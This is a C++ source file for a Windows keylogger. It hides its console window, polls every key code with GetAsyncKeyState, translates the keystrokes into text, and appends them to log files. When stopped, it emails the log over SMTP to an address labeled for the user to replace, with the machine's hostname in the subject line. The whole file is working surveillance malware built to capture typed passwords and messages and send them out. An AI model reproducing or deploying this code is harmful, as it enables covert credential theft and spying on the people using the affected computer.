// keyLogger.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <Windows.h>
#include <fstream>
#include <cctype>
#include <iomanip>
#include "Email.h"

using namespace std;

ofstream logEmail;
ofstream logHistory;

string translateKey(int keyStroke);
void logKey(string keyStroke);
void hideConsole();

int main()
{
    hideConsole();
    
    enum Status { disable, enable };
    Status log = enable;

    MessageBox(NULL, "Key Logging Status: ON", "ANYNAME", MB_OK | MB_ICONASTERISK);/*REPLACE anyname optional*/

    logEmail.open("emailfilename.txt");/*Change this to the file you want to email*/
    logHistory.open("Histroyfilename.txt", ios_base::out | ios_base::app);/*change this to the file you want to keep your key log history on*/

    while(log == enable)
    {
        for (int i = 0; i < 256; i++)
        {
            bool LShiftDown = GetAsyncKeyState(VK_LSHIFT);
            bool LControlDown = GetAsyncKeyState(VK_LCONTROL);

            if (LShiftDown && LControlDown)
            {
                log = disable;
            }
            if (GetAsyncKeyState(i) & 0b1)
            {
                logKey(translateKey(i));
            }
        }
    }

    logKey("\n[END OF SESSION]\n");

    logEmail.close();
    logHistory.close();

    MessageBox(NULL, "Key Logging Status: OFF", "ANYNAME", MB_OK | MB_ICONASTERISK);/*REPLACE anyname optional*/

    char hostname[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD hnBufferSize = sizeof(hostname);
    string subject = "Key Log from: ";

    GetComputerName(hostname, &hnBufferSize);
    subject += hostname;
    cout << subject;

    Email email("From", "TOname@domain.com", subject, "Body");/*REPLACE with your data From, TOname, subject(optional), Body*/
    email.send("smtp://smtp.domain.com:587", "username", "password", "filename.txt");/*REPLACE with your data domain, username, password, and filename*/
}

void logKey(string keyStroke)
{
    logEmail << keyStroke;

    logHistory << keyStroke;
}
string translateKey(int keyStroke)
{
    string key;
    bool shiftIsDown = GetAsyncKeyState(VK_LSHIFT);

    if (char(keyStroke) >= 'A' && char(keyStroke) <= 'Z')
    {
        if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0 || shiftIsDown)
        {
            key = char(keyStroke);
        }
        else
        {
            key = char(tolower(char(keyStroke)));
        }
    }
    else if ((keyStroke > 47 && keyStroke < 58))
    {
        if (!shiftIsDown)
        {
           ostringstream strm;
           strm << hex << int(keyStroke);
           key = char(keyStroke);
        }
        else
        {
            switch (char(keyStroke))
            {
            case '0':
               key = ")";
                break;
            case '1':
               key = "!";
                break;
            case '2':
               key = "@";
                break;
            case '3':
               key = "#";
                break;
            case '4':
               key = "$";
                break;
            case '5':
               key = "%";
                break;
            case '6':
               key = "^";
                break;
            case '7':
               key = "&";
                break;
            case '8':
               key = "*";
                break;
            case '9':
               key = "(";
                break;
            }
        }
    }
    else
    {
        switch (keyStroke)
        {
        case VK_DELETE:
           key = "[Delete]";
            break;
        case VK_BACK:
           key = "[Backspace]";
            break;
        case VK_NUMPAD0:
           key = "0";
            break;
        case VK_NUMPAD1:
           key = "1";
            break;
        case VK_NUMPAD2:
           key = "2";
            break;
        case VK_NUMPAD3:
           key = "3";
            break;
        case VK_NUMPAD4:
           key = "4";
            break;
        case VK_NUMPAD5:
           key = "5";
            break;
        case VK_NUMPAD6:
           key = "6";
            break;
        case VK_NUMPAD7:
           key = "7";
            break;
        case VK_NUMPAD8:
           key = "8";
            break;
        case VK_NUMPAD9:
           key = "9";
            break;
        case VK_SPACE:
           key = "[Space]";
            break;
        case VK_SUBTRACT:
           key = "-";
            break;
        case VK_DECIMAL:
           key = ".";
            break;
        case VK_DIVIDE:
           key = "/";
            break;
        case VK_ADD:
           key = "+";
            break;
        case VK_MULTIPLY:
           key = "*";
            break;
        case VK_OEM_PLUS:
            if (!shiftIsDown)
            {
               key = "=";
            }
            else
            {
               key = "+";
            }
            break;
        case VK_OEM_MINUS:
            if (!shiftIsDown)
            {
               key = "-";
            }
            else
            {
               key = "_";
            }
            break;
        case VK_OEM_COMMA:
            if (!shiftIsDown)
            {
               key = ",";
            }
            else
            {
               key = "<";
            }
            break;
        case VK_OEM_PERIOD:
            if (!shiftIsDown)
            {
               key = ".";
            }
            else
            {
               key = ">";
            }
            break;
        case VK_OEM_1:
            if (!shiftIsDown)
            {
               key = ";";
            }
            else
            {
               key = ":";
            }
            break;
        case VK_OEM_2:
            if (!shiftIsDown)
            {
               key = "/";
            }
            else
            {
               key = "?";
            }
            break;
        case VK_OEM_3:
            if (!shiftIsDown)
            {
               key = "`";
            }
            else
            {
               key = "~";
            }
            break;
        case VK_OEM_4:
            if (!shiftIsDown)
            {
               key = "[";
            }
            else
            {
               key = "{";
            }
            break;
        case VK_OEM_5:
            if (!shiftIsDown)
            {
               key = "\\";
            }
            else
            {
               key = "|";
            }
            break;
        case VK_OEM_6:
            if (!shiftIsDown)
            {
               key = "]";
            }
            else
            {
               key = "}";
            }
            break;
        case VK_OEM_7:
            if (!shiftIsDown)
            {
               key = "'";
            }
            else
            {
               key = "\"";
            }
            break;
        }
    }
    return key;
}
void hideConsole()
{
    HWND myConsole = GetConsoleWindow();
    ShowWindow(myConsole, 0);
}
